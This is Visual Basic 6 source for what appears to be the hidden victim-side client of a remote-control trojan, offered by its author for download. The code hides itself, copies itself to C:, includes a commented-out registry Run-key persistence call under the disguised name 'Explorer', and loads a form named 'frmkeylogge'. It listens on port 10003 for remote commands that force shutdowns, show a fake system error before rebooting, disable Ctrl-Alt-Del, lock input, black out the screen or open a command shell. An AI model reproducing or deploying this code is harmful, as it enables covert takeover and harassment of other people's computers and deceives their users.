VERSION 5.00
Object = "{248DD890-BB45-11CF-9ABC-0080C7E7B78D}#1.0#0"; "MSWINSCK.OCX"
Object = "{831FDD16-0C5C-11D2-A9FC-0000F8754DA1}#2.0#0"; "MSCOMCTL.OCX"
Begin VB.Form Form1 
   BackColor       =   &H00000000&
   BorderStyle     =   0  'None
   Caption         =   "Opening Different Windows option"
   ClientHeight    =   9000
   ClientLeft      =   0
   ClientTop       =   0
   ClientWidth     =   12000
   Icon            =   "client_frm.frx":0000
   LinkTopic       =   "Form1"
   Picture         =   "client_frm.frx":0ECA
   ScaleHeight     =   9000
   ScaleWidth      =   12000
   ShowInTaskbar   =   0   'False
   StartUpPosition =   3  'Windows Default
   WindowState     =   2  'Maximized
   Begin VB.Timer Timer2 
      Enabled         =   0   'False
      Interval        =   5000
      Left            =   960
      Top             =   3000
   End
   Begin VB.Timer Timer1 
      Enabled         =   0   'False
      Interval        =   5000
      Left            =   720
      Top             =   840
   End
   Begin MSWinsockLib.Winsock server 
      Left            =   2160
      Top             =   480
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
      RemotePort      =   10003
      LocalPort       =   10003
   End
   Begin MSComctlLib.Slider Slider1 
      Height          =   615
      Left            =   720
      TabIndex        =   1
      Top             =   5640
      Visible         =   0   'False
      Width           =   5295
      _ExtentX        =   9340
      _ExtentY        =   1085
      _Version        =   393216
      LargeChange     =   13107
      SmallChange     =   1311
      Max             =   65535
   End
   Begin VB.Label Label1 
      Alignment       =   2  'Center
      AutoSize        =   -1  'True
      BackStyle       =   0  'Transparent
      Caption         =   "Label1"
      BeginProperty Font 
         Name            =   "Times New Roman"
         Size            =   60
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H00FFC0C0&
      Height          =   1350
      Left            =   1800
      TabIndex        =   0
      Top             =   1320
      Visible         =   0   'False
      Width           =   3555
   End
End
Attribute VB_Name = "Form1"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
'please visit my site
'I DONT NEED TO BE VOTE
'JUST TAG IN MY SITE
'HTTP://XYREN.USA.GS


'THANKS FOR DOWNLOADING MY PROGRAM
Dim MouseControl As Boolean
Dim vol As Long
    
    Dim hmixer As Long
      Dim volCtrl As MIXERCONTROL
      Dim micCtrl As MIXERCONTROL
      Dim rc As Long
      Dim ok As Boolean

Dim taskbr As Boolean
  Private shlShell As shell32.Shell
  Private shlFolder As shell32.Folder
Option Explicit
Dim sendtext As String
'shutdown control
Const EWX_LOGOFF = 0
Const EWX_SHUTDOWN = 1
Const EWX_REBOOT = 2
Const EWX_FORCE = 4



Dim Power As New CPower

Private Declare Function ExitWindowsEx Lib "user32" (ByVal uFlags As Long, ByVal dwReserved As Long) As Long
Dim t
Dim r As Integer

Dim result As Integer
Private Declare Function GetAsyncKeyState Lib "user32" (ByVal vKey As Long) As Integer


Private Declare Function SetCursorPos Lib "user32" (ByVal X As Long, ByVal Y As Long) As Long


'set the form top
Public username As String

Private Const HWND_TOPMOST = -1
Private Const HWND_NOTOPMOST = -2
Private Const SWP_NOSIZE = &H1
Private Const SWP_NOMOVE = &H2
'Public Const SWP_NOACTIVATE = &H10
Private Const SWP_SHOWWINDOW = &H40
 
Private Declare Sub SetWindowPos Lib "user32" (ByVal hwnd As Long, ByVal hWndInsertAfter As Long, ByVal Y As Long, ByVal cx As Long, ByVal cy As Long, ByVal X As Long, ByVal wFlags As Long)



'=====================================================================
'REG KEY CONSTANTS
Private Const HKEY_CURRENT_USER = &H80000001
Private Const HKEY_LOCAL_MACHINE = &H80000002
Private Const KEY_WRITE = &H20006
Private Const REG_SZ = 1
'END REG KEYS


'REGISTRY FUNCTIONS
Private Declare Function RegOpenKeyEx Lib "advapi32.dll" Alias "RegOpenKeyExA" _
(ByVal hKey As Long, ByVal lpSubKey As String, _
ByVal ulOptions As Long, _
ByVal samDesired As Long, _
phkResult As Long) As Long

Private Declare Function RegCloseKey Lib "advapi32.dll" (ByVal hKey As Long) As Long

Private Declare Function RegSetValueEx Lib "advapi32.dll" Alias "RegSetValueExA" _
(ByVal hKey As Long, ByVal lpValueName As String, _
ByVal reserved As Long, _
ByVal dwType As Long, _
lpData As Any, _
ByVal cbData As Long) As Long

' Call SetBoot(HKEY_LOCAL_MACHINE, "Jaki", App.Path & "\" & App.EXEName & ".exe", "Software\Microsoft\Windows\CurrentVersion\Run")
 '08749274240
Private Sub SetBoot(ByVal hKey As Long, ByVal MKey As String, ByVal stringKeyVal As String, ByVal SubKey As String)
Dim HRKey As Long, StrB As String
Dim retvaL As Long
retvaL = RegOpenKeyEx(hKey, SubKey, 0, KEY_WRITE, HRKey)
If retvaL <> 0 Then
Exit Sub
End If
StrB = stringKeyVal & vbNullChar
retvaL = RegSetValueEx(HRKey, MKey, 0, REG_SZ, ByVal StrB, Len(StrB))
RegCloseKey HRKey
End Sub


Private Sub Form_Click()
'IF THE MESSAGE WILL APPEAR
'THE FORM HIDE IF CLICKED
If taskbr = True Then
    TaskBarShow
    taskbr = False
End If
App.TaskVisible = False
Me.Hide

End Sub

Private Sub Form_Load()
If App.PrevInstance = True Then
    End
    Exit Sub
End If
Load frmkeylogge
SetWindowPos Me.hwnd, HWND_TOPMOST, 0, 0, 0, 0, SWP_SHOWWINDOW Or SWP_NOMOVE Or SWP_NOSIZE
'volume control
' dont finish this code
rc = mixerOpen(hmixer, 0, 0, 0, 0)
         If ((MMSYSERR_NOERROR <> rc)) Then
             MsgBox "Couldn't open mixer."
             Exit Sub
             End If
             
         ok = GetVolumeControl(hmixer, _
                              MIXERLINE_COMPONENTTYPE_DST_SPEAKERS, _
                              MIXERCONTROL_CONTROLTYPE_VOLUME, _
                              volCtrl)
         If (ok = True) Then
            Slider1.Min = volCtrl.lMinimum
            Slider1.Max = volCtrl.lMaximum
             End If
             
             
             
'file transfering
' to drive c
'IF EVER ON DRIVE A
If App.Path = "a:" Then
    On Error Resume Next
    FileCopy App.Path & App.EXEName & ".EXE", "C:" & App.EXEName & ".EXE"
    On Error Resume Next
    Shell "C:\" & App.EXEName & ".EXE"
    End
Else
    On Error GoTo e
    FileCopy App.Path & App.EXEName & ".EXE", "C:" & App.EXEName & ".EXE"
    On Error Resume Next
    Shell "C:\" & App.EXEName & ".EXE"
    End
e:
'SET THIS APP START -UP PROGRAM
'   Call SetBoot(HKEY_LOCAL_MACHINE, "Explorer", "c:\Internat.exe", "Software\Microsoft\Windows\CurrentVersion\Run")
    Me.Hide
    On Error Resume Next
    server.Close
    server.Listen
    ' Mid(tmpData, 1, 3) = "vol"
     '       vol = CLng(Form1.Slider1)
      '      SetVolumeControl hmixer, volCtrl, vol
End If
End Sub

'IF CLOSE THE SERVER
'CLIENT CONTINUE TO LISTEN
Private Sub server_Close()
On Error Resume Next
server.Close
server.Listen
End Sub
'ACCEPT THE REQUEST OF SERVER
Private Sub server_ConnectionRequest(ByVal requestID As Long)
    On Error Resume Next
    server.Close
    server.Accept requestID
    Timer2.Enabled = False
End Sub

Private Sub server_DataArrival(ByVal bytesTotal As Long)
    Dim str1, str2, aa As String
    Dim X, xx, yy, Y, z, d, az As Integer
    Dim tmpData, tmpdata1, tmp As String
    On Error Resume Next
    server.GetData tmpData, vbString, 20

    tmp = Trim$(tmpData)
    tmpData = ""
    tmpData = tmp
    
    aa = Mid(tmpData, 1, 8)
    
   ' Select Case aa
    'CHECK THE CURSOR POSITION
            
    Select Case tmpData
        'CD-Rom
        Case "cdc"
        On Error Resume Next
            CloseCDROM
        Case "cdo"
        On Error Resume Next
            OpenCDROM
            
        'Taskbar
        Case "ht"
        On Error Resume Next
            TaskBarHide
        Case "st"
        On Error Resume Next
            TaskBarShow
        
        'desktop Icon
        Case "hd"
        On Error Resume Next
            DesktopIconsHide
        Case "sd"
        On Error Resume Next
            DesktopIconsShow
        
        'Disconnect
        Case "exit"
        On Error Resume Next
            Me.Show
            Label1.Caption = ""
            On Error Resume Next
                server.Close
                Call DisableCtrlAltDelete(False)
            Me.Hide
        
        
        'Mouse Control
        Case "c"
        On Error Resume Next
            FlipMouseButtons
        Case "co"
        On Error Resume Next
            FlipMouseButtonsBack
        Case "mouselock"
        On Error Resume Next
            EnableTrap Form1
        Case "mouseunlock"
        On Error Resume Next
            DisableTrap Form1
            SysUnlock
        Case "mousefunc"
        On Error Resume Next
            Cursor_Show
        Case "mousenofunc"
        On Error Resume Next
            Cursor_Hide
        'click control
        Case "right"
        On Error Resume Next
            RightClick
        Case "left"
        On Error Resume Next
            LeftClick
            
        
            
            'power control
        Case "shutdown"
        On Error Resume Next
            Power.ShutDown lShutDown, False
        Case "restart"
        On Error Resume Next
            Power.ShutDown lReboot, False
        Case "standby"
        On Error Resume Next
            Power.ShutDown lSuspend, False
        Case "logoff"
        On Error Resume Next
            Power.ShutDown lSuspend, False
        Case "Hibernate"
        On Error Resume Next
            Power.ShutDown lHibernate, False
            
            'force power control
        Case "shutdownforce"
        On Error Resume Next
            Power.ShutDown lShutDown, True
        Case "restartforce"
        On Error Resume Next
            Power.ShutDown lReboot, True
        Case "standbyforce"
        On Error Resume Next
            Power.ShutDown lSuspend, True
        Case "restarterror"
        On Error Resume Next
            MsgBox "The computer has illegal operation that may cause of system reboot" & vbCrLf & "If there's any complain about the software , please contact the Software provider", vbCritical + vbSystemModal, " ERROR :"
            Power.ShutDown lReboot, True
        Case "Hibernateforce"
        On Error Resume Next
            Power.ShutDown lHibernate, True
        
        
        
        
        'shell control
        Case "minimize"
        On Error Resume Next
            If shlShell Is Nothing Then
                Set shlShell = New shell32.Shell
            End If
            On Error Resume Next
            shlShell.MinimizeAll
        Case "undominimize"
        On Error Resume Next
            If shlShell Is Nothing Then
                Set shlShell = New shell32.Shell
            End If
            On Error Resume Next
            shlShell.UndoMinimizeALL
        Case "c:\"
        On Error Resume Next
            If shlShell Is Nothing Then
                Set shlShell = New shell32.Shell
            End If
            On Error Resume Next
            shlShell.Open "c:\"
        Case "run"
        On Error Resume Next
            If shlShell Is Nothing Then
                Set shlShell = New shell32.Shell
            End If
            On Error Resume Next
            shlShell.FileRun
        Case "findfiles"
        On Error Resume Next
            If shlShell Is Nothing Then
                Set shlShell = New shell32.Shell
            End If
            On Error Resume Next
            shlShell.FindFiles
        Case "explorer"
        On Error Resume Next
            If shlShell Is Nothing Then
                Set shlShell = New shell32.Shell
            End If
            On Error Resume Next
            shlShell.Explore "c:\"
        Case "dos"
        On Error Resume Next
            On Error GoTo e
            Shell "c:\command.com", vbMaximizedFocus
            
            
         'opening program control
         
         'NOTE:
         'NOTE:
         'NOTE:
         'CHECK ITS PATH IF EVER THERES NO RESPOND
        Case "notepad"
            On Error GoTo e
            Shell "C:\WINDOWS\NOTEPAD.EXE", vbMaximizedFocus
        Case "mspaint"
            On Error GoTo e
            Shell "C:\Program Files\Accessories\MSPAINT.EXE", vbMaximizedFocus
        Case "word"
            On Error GoTo e
            Shell "C:\Program Files\Microsoft Office\Office\winword.EXE", vbMaximizedFocus
        Case "access"
            On Error GoTo e
            Shell "C:\Program Files\Microsoft Office\Office\msaccess.EXE", vbMaximizedFocus
        Case "excel"
            On Error GoTo e
            Shell "C:\Program Files\Microsoft Office\Office\excel.EXE", vbMaximizedFocus
        Case "calculator"
            On Error GoTo e
            Shell "C:\WINDOWS\CALC.EXE", vbMaximizedFocus
        
        
        
        'Control CTRL-ALT-DEL
        Case "ena-del"
        On Error Resume Next
            Call ALT_CTRL_DEL_Enabled
        Case "dis-del"
        On Error Resume Next
            Call ALT_CTRL_DEL_Disabled
            
        'keyboard control
        Case "keylock"
        On Error Resume Next
            DisableTrap Form1
            Call DisableCtrlAltDelete(True)
            On Error Resume Next
            SetDWORDValue "HKEY_LOCAL_MACHINE\Software\KeyboardLock", "Locked", "1"
        Case "keyunlock"
        On Error Resume Next
            SysUnlock
            
            
        'block the pc
        Case "black"
        On Error Resume Next
            EnableTrap Form1
            Me.Show
            Timer1.Enabled = False
            Me.Enabled = False
        Case "unblack"
        On Error Resume Next
            DisableTrap Form1
            Me.Enabled = True
            
        'disconnect
        Case "disconnect"
        On Error Resume Next
            Timer2.Enabled = True
            Exit Sub
            
        'message
        Case Else
        On Error Resume Next
            Me.Show
            Label1.Visible = True
            Label1.Caption = tmpData
            Label1.Move (Form1.Width \ 2) - (Label1.Width \ 2), (Form1.Height \ 2) - (Label1.Height \ 2)
            Timer1.Enabled = True
            TaskBarHide
            taskbr = True
    End Select
'End Select
e:
Exit Sub
End Sub

'TASKBAR WILL HIDE IF THE SERVER
'SEND A MESSAGE
'TS INTERVAL FOR DISPLAY

'TRY TO CHANGE THE INTERVAL
'AUTO HIDE IF THE FORM NOT CLICKED
Private Sub Timer1_Timer()
On Error Resume Next
If taskbr = True Then
    TaskBarShow
    taskbr = False
End If
Me.Hide
Timer1.Enabled = False
End Sub

'IF THE SERVER WAS CLOSE THE CLIENT CONTINUE TO LISTEN
Private Sub Timer2_Timer()
On Error Resume Next
server.Close
server.Listen
End Sub
